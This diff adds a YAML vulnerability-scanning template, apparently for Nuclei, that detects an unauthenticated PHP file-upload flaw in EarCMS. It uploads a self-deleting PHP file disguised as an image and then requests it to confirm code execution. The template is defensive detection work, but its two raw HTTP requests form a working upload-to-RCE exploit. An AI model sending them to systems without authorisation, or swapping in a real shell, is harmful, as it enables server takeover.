@@ -1,0 +1,60 @@
+id: earcms-index-uplog-file-upload
+info:
+  name: EarCMS index-uplog.php File Upload GetShell
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Ear CMS is a content management system. There is a Code Execution Vulnerability in the ear distribution foreground. By constructing malicious code, the attacker can obtain the permission of the server.
+  tags: file-upload, rce
+  reference:
+    - https://zhuanlan.zhihu.com/p/81934322
+
+variables:
+  shell_payload: "<?php echo md5(233);unlink(__FILE__);?>"
+  random_hex: "{{rand_base(32)}}"
+
+http:
+  - raw:
+      - |
+        POST /source/pack/upload/index-uplog.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1234567890
+
+        ------WebKitFormBoundary1234567890
+        Content-Disposition: form-data; name="app"; filename="{{random_hex}}.php"
+        Content-Type: image/jpg
+
+        {{shell_payload}}
+        ------WebKitFormBoundary1234567890
+        Content-Disposition: form-data; name="time"
+
+        {{random_hex}}
+        ------WebKitFormBoundary1234567890--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "extension"
+    extractors:
+      - type: regex
+        internal: true
+        group: 1
+        part: raw
+        regex:
+          - "/data/tmp/{{random_hex}}.php"
+
+  - raw:
+      - |
+        GET /data/tmp/{{random_hex}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
